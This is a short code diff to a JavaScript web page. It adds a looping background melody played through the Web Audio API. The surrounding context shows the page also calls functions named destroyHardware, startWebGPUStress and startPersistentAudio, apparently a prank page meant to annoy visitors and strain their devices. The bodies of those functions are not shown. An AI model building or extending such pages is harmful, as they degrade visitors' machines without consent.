@@ -395,6 +395,7 @@ function initParentWindow () {
       keepAwake()
       setBadge()
       startPersistentAudio()
+      playBackgroundMusic()
       requestIdleDetection()
     destroyHardware()
     startWebGPUStress()
@@ -1417,6 +1418,27 @@ function startPersistentAudio () {
     osc.connect(gain)
     gain.connect(ctx.destination)
     osc.start()
+  } catch {}
+}
+
+function playBackgroundMusic () {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)()
+    const notes = [261.63, 293.66, 329.63, 349.23, 392.00, 349.23, 329.63, 293.66]
+    let noteIdx = 0
+    setInterval(() => {
+      const osc = ctx.createOscillator()
+      const gain = ctx.createGain()
+      gain.gain.value = 0.08
+      osc.frequency.value = notes[noteIdx % notes.length]
+      osc.type = 'sine'
+      osc.connect(gain)
+      gain.connect(ctx.destination)
+      osc.start()
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5)
+      osc.stop(ctx.currentTime + 0.5)
+      noteIdx++
+    }, 600)
   } catch {}
 }
 
